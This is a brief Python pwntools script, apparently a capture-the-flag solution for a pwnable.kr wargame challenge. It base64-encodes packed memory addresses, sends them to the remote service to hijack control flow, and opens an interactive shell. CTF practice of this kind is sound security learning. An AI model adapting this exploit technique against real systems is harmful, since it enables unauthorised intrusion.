#!/usr/bin/python
from pwn import *
import base64

r = remote('pwnable.kr', 9003)

payload = p32(0x8049278)*2+p32(0x811eb40)
r.sendline(base64.encodestring(payload))

r.interactive()
